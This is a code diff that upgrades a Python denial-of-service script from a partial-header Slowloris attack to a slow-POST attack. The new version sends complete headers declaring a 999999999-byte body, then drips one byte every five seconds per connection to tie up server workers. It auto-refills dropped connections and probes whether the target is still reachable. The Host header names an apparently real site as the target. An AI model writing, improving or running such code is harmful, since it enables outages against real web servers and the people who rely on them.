@@ -21,14 +21,17 @@ from datetime import datetime
 G = "\033[0;32m"; R = "\033[0;31m"; Y = "\033[0;33m"
 C = "\033[0;36m"; B = "\033[1m"; W = "\033[0m"
 
-PARTIAL_HEADER = (
-    b"GET / HTTP/1.1\r\n"
+COMPLETE_HEADERS = (
+    b"POST / HTTP/1.1\r\n"
     b"Host: metoo-shatkin.com\r\n"
     b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
     b"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\r\n"
     b"Accept: text/html,application/xhtml+xml\r\n"
-    b"X-Forwarded-For: "           # intentionally incomplete — never sends \r\n\r\n
+    b"Content-Type: application/octet-stream\r\n"
+    b"Content-Length: 999999999\r\n"
+    b"\r\n"                         # headers complete — server allocates body buffer
 )
+DRIP_INTERVAL = 5   # seconds between each 1-byte drip
 
 
 def probe_port(target, port, timeout=5):
@@ -66,8 +69,9 @@ def _is_dead(s):
 
 def open_slowloris_socket(target, port):
     """
-    Connect and send a partial HTTP request — never completes headers.
-    Server holds the connection waiting for the rest of the request.
+    Connect, send complete headers with Content-Length: 999999999,
+    then drip 1 byte every DRIP_INTERVAL seconds in a background thread.
+    Server allocates body buffer and pins a worker waiting for the rest.
     Returns socket or None.
     """
     try:
@@ -75,10 +79,21 @@ def open_slowloris_socket(target, port):
         s.settimeout(5)
         s.connect((target, port))
         s.settimeout(None)
-        s.send(PARTIAL_HEADER)
+        s.send(COMPLETE_HEADERS)
+        threading.Thread(target=_drip, args=(s,), daemon=True).start()
         return s
     except Exception:
         return None
+
+
+def _drip(s):
+    """Send 1 byte every DRIP_INTERVAL seconds to keep the body transfer alive."""
+    while True:
+        try:
+            s.send(b'x')
+            time.sleep(DRIP_INTERVAL)
+        except Exception:
+            return
 
 
 def main():
@@ -98,7 +113,7 @@ def main():
   Slowloris — partial HTTP header exhaustion on :{args.port}
 {B}{'='*62}{W}
   Target      : {args.target}:{args.port}
-  Connections : {args.connections} (partial HTTP, auto-refill dead)
+  Connections : {args.connections} (slow POST body, auto-refill dead)
   Proof       : probe_8080 + probe_80 fresh-connect each cycle
 {B}{'='*62}{W}
 """)
